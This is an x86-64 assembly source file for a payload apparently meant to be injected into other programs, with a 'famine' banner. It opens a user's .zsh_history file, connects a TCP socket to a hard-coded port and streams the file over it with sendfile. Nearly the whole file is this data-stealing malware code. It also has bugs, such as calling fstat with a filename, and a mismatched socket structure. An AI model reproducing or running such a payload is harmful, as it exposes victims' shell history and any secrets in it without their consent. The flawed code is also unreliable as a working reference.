[BITS 64]

global _payload
global _payload_size

%macro pushx 1-*
%rep %0
	push %1
	%rotate 1
%endrep
%endmacro

%macro popx 1-*
%rep %0
	%rotate -1
	pop %1
%endrep
%endmacro

%macro POPS 1-*
%rep %0
	pop rax
	%rotate 1
%endrep
%endmacro

section .text

;; Data definitions
struc sockaddr_in
	.sin_len resb 1
    .sin_family resw 1
    .sin_port resw 1
    .sin_addr resd 1
    .sin_zero resb 8
endstruc

_payload:
	pushx rax, rdi, rsi, rdx, r10

	; write a message
	mov rax, 1			; SYS_write
	mov rdi, 1			; file descriptor (stdout)
	lea rsi, [rel .msg]	; pointer to message
	mov rdx, 7			; length of message
	syscall

	; Open the file
	mov rax, 2					; SYS_open
	lea rdi, [rel FILEPATH]		; filename
	mov rsi, 0					; flags (O_RDONLY)
	syscall
	cmp rax, -1
	jl .clean
	mov r12, rax

	; stat the file
	mov rax, 4					; SYS_fstat
	lea rdi, [rel FILEPATH]		; filename
	lea rsi, [rel STATBUFFER]	; stat buffer
	syscall
	cmp rax, -1
	je .clean

	; Affichage de succès (utilisation de write)
    mov rax, 1                   ; numéro de syscall pour write
    mov rdi, 1                   ; descripteur de fichier (stdout)
    lea rsi, [rel STATBUFFER]   ; message de succès
    mov rdx, 144     ; longueur du message
    syscall

	jmp .connect

.msg	db "famine", 0x0a, 0

.connect:
	; Create the socket
	mov rax, 41					; SYS_socket
	mov rdi, 2					; domain (AF_INET)
	mov rsi, 1					; type (SOCK_STREAM)
	mov rdx, 0					; protocol
	syscall
	cmp rax, -1
	je .clean
	mov r13, rax

	; Prepare sockaddr_in structure
	; mov word [rel CONNECT_BUFFER + 1], 2          ; sin_family (AF_INET)
	; movzx rax, word [rel SERVER_PORT]
	; mov word [rel CONNECT_BUFFER + 2], ax ; sin_port
	; mov eax, [rel SERVER_ADDR] ; Load the value from memory into EAX register
	; mov dword [rel CONNECT_BUFFER + 4], eax ; Move the value from EAX register to the destination memory location
	; mov [pop_sa + sockaddr_in.sin_port], bx
	
	; Connect the socket
	mov rax, 42					; SYS_connect
	mov rdi, r13				; socket file descriptor
	lea rsi, [rel pop_sa]		; pointer to sockaddr_in
	mov rdx, 16					; size of sockaddr_in
	syscall
	cmp rax, -1
	je .clean

	; Send the file
	mov rax, 40						; SYS_sendfile
	mov rdi, r13					; socket file descriptor
	mov rsi, r12					; file descriptor
	xor rdx, rdx					; offset (NULL)
	mov r10, [rel STATBUFFER + 48]	; size
	syscall

	jmp .clean

.clean:
	; Close the file
	mov rax, 3					; SYS_close
	mov rdi, r12				; file descriptor
	syscall

	; Close the socket
	mov rax, 3					; SYS_close
	mov rdi, r13				; file descriptor
	syscall

	popx rax, rdi, rsi, rdx, r10
	; jmp     [rel 0x0]
	mov rax, 0
	ret

section .data
STATBUFFER		times 144 db 1
; CONNECT_BUFFER	times 16 db 0
;; sockaddr_in structure for the address the listening socket binds to
pop_sa istruc sockaddr_in
	at sockaddr_in.sin_len,		db 16
	at sockaddr_in.sin_family,	dw 2			; AF_INET
	at sockaddr_in.sin_port,	dw 0xa1ed		; port 60833
	at sockaddr_in.sin_addr,	dd 0			; localhost
	at sockaddr_in.sin_zero,	dd 0, 0
iend
; FILEPATH		times 1024 db 0
FILEPATH		db '/home/maxence/.zsh_history', 0
SERVER_PORT		dd 0xba0b
SERVER_ADDR		dw 0x0

; _payload_size:	dq $-_payload